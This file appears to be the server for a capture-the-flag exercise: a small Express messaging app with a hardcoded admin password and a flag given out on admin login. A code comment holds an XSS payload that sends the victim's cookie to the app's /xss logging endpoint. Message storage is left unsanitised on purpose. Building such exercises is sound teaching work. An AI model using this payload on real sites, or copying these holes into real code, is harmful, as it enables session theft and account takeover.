/*jslint node: true */
/*jslint esversion: 6 */
"use strict";

let express = require('express');
let bodyParser = require('body-parser');
let logger = require('morgan');
let fs = require('fs');

let app = express();
app.use(express.static('public'));
app.use(logger('common', {
    stream: fs.createWriteStream('./access.log', {flags: 'a'})
}));
app.use(bodyParser.json({}));
app.use(bodyParser.urlencoded({ extended: true }));

// <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" onload=window.location="/xss?"+document.cookie />
let users = {
  admin: 'qoSRFI24sf'
};

let messages = {};

app.post('/v1/session', function(req, res) {
  let username = req.body.username;
  let password = req.body.password;
  if (!username || !password) {
    res.status(400).send({ error: 'Must specify username and password' });
  } else if (!users[username]) {
    res.status(401).send({ error: 'Username not found' });
  } else if (users[username] !== password) {
    res.status(401).send({ error: 'Username and password are incorrect' });
  } else if (username !== 'admin') {
    res.status(201).send({
      username: username,
      password: password
    });
  } else {
    res.status(201).send({
      username: username,
      password: password,
      flag: '_FLAG_(xss_all_day)'
    });
  }
});

app.post('/v1/user', function(req, res) {
  let username = req.body.username;
  let password = req.body.password;
  if (!username || !password) {
    res.status(400).send({ error: 'Must specify username and password' });
  } else if (users[username]) {
    res.status(400).send({ error: 'Username already in use' });
  } else {
    users[username] = password;
    messages[username] = [
      {
        subject: 'Welcome to my website!',
        message: 'Welcome to my website! I hope you enjoy yourself!'
      }
    ];
    res.status(201).send({
      username: username,
      password: password
    });
  }
});

app.post('/v1/send', function(req, res) {
  let recipient = req.body.recipient;
  let subject = req.body.subject;
  let message = req.body.message;
  if (recipient === 'admin') {
    console.log('ADMIN RECEIVED MESSAGE');
  }
  if (!recipient || !subject || !message) {
    res.status(400).send({ error: 'Must specify recipient, subject, and message' });
  } else {
    if (!messages[recipient]) messages[recipient] = [];
    messages[recipient].push(
      {
        subject: subject,
        message: message
      }
    );
    res.status(201).send();
  }
});

app.get('/v1/messages', function(req, res) {
  let username = req.query.username;
  let password = req.query.password;
  if (!username || !password) {
    res.status(400).send({ error: 'Must specify username and password' });
  } else if (users[username] !== password) {
    res.status(401).send({ error: 'Username does not match password' });
  } else {
    res.status(201).send(messages[username]);
  }
});

app.get('/xss', function(req, res) {
  console.log(req.query);
});

let server = app.listen(8087, function () {
    console.log('Example app listening on ' + server.address().port);
});
